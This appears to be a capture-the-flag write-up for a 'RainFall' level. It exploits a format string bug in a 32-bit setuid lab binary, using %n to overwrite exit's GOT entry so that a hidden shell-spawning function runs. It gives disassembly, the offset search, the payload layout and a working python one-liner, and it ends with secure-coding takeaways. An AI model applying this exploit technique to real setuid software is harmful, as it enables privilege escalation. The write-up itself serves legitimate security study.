# LEVEL05 - Format String GOT Overwrite

> Vulnerability class: Format String
> Binary: ELF 32-bits, dynamically linked, not stripped
> Tools used: GDB, objdump, file


---

## Overview

The program passes user input directly to `printf()` without a format string specifier. The binary contains an uncalled function `o()` that spawns a shell via `system()`. By abusing the format string vulnerability, we overwrite the GOT entry of `exit()` with the address of `o()`, so that when `exit()` is called, execution redirects to `o()` instead.

## 1. Reconnaissance

```bash
$ file level5
level5: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, not stripped
```
```bash
$ checksec --file ./level5
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level5
```

Key observations:

- setuid/setgid binary: successful exploitation escalates privileges
- not stripped: function names are preserved, simplifying static analysis
- dynamically linked: library functions resolved at runtime via PLT/GOT
- NX disabled: the stack and heap are executable, meaning injected shellcode can run directly
- ASLR off: addresses are fixed across runs, no need to leak or brute force memory layout
- No stack canary: the saved return address can be overwritten without triggering any detection
- No PIE: the binary is loaded at a fixed base address every time, making PLT/GOT addresses predictable

---

## 2. Static Analysis

### 2.1 The `n()` function

`n()` reads user input with `fgets()` and passes it directly to `printf()` without a format specifier, then calls `exit()`:
```asm
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
```

### 2.2 The `o()` function

`o()` is never called by the program but contains the target `system()` call:
```asm
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x18,%esp
   0x080484aa <+6>:     movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    movl   $0x1,(%esp)
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
```
```bash
   (gdb) x/s 0x80485f0
   0x80485f0:       "/bin/sh"
```

Goal: redirect `exit()` to `o()` by overwriting `exit`'s GOT entry with `0x080484a4`.

---

## 3. Vulnerability

Root cause: `printf(buffer)` passes user-controlled input as the format string. An attacker can inject `%n` to write arbitrary values to arbitrary memory addresses.

The GOT entry for `exit()` at `0x08049838` is writable and resolved at runtime. Since ASLR is off, its address is fixed and predictable — making it a reliable overwrite target.

---

## 4. Exploitation

### 4.1 Offset calculation using `%x`

We identify the position of our input buffer on the stack by using `AAAA` (`0x41414141`) as a marker:
```bash
    level5@RainFall:~$ ./level5
    AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
    AAAA200.b7fd1ac0.b7ff37d0.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.a78.0.b7fe765d.b7e3ebaf
```
`0x41414141` appears at position **4** — our input buffer is the 4th argument seen by `printf()`.

### 4.2 Locating the GOT entry for `exit()`

```bash
   level5@RainFall:~$ objdump -R ./level5 | grep exit
   08049828 R_386_JUMP_SLOT   _exit
   08049838 R_386_JUMP_SLOT   exit
```
We target `exit@GOT` at `0x08049838`. When `exit()` is called at the end of `n()`, the dynamic linker reads this address — overwriting it with `o()` redirects execution there instead.

### 4.3 Payload construction

We need `printf()` to have printed exactly `134513828` characters when `%n` fires, since `0x080484a4 = 134513828` in decimal:
```txt
   [ 4 bytes: exit@GOT address ] + [ %134513824c ] + [ %4$n ]
```

- `\x38\x98\x04\x08` — address of `exit@GOT` in little-endian (4 bytes, already counted by `printf`)
- `%134513824c` — prints 134513824 additional characters, bringing the total to `4 + 134513824 = 134513828`
- `%4$n` — writes the character count into the address at the 4th argument (our buffer start = `exit@GOT`), replacing `exit()`'s GOT entry with the address of `o()`

### 4.4 Execution

```bash
   level5@RainFall:~$ (python -c 'print "\x08\x04\x98\x38"[::-1] + "%134513824c%4$n"'; cat) | ./level5
   [...]
   cat /home/user/level6/.pass
   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
[...]
```

## 5. Key Takeaways

| Concept | Detail |
|---|---|
| `printf(buffer)` is unsafe | Always use `printf("%s", buffer)` — never pass user input as the format string |
| GOT overwrite | GOT entries are writable at runtime — overwriting one redirects all future calls to that function |
| `%n` for arbitrary write | Writes character count to a pointer argument — powerful write primitive |
| Dead code reachability | Functions never called by the program can still be reached via control flow hijacking |
| GOT vs PLT | PLT is read-only stub code; GOT holds the actual resolved addresses and is writable |
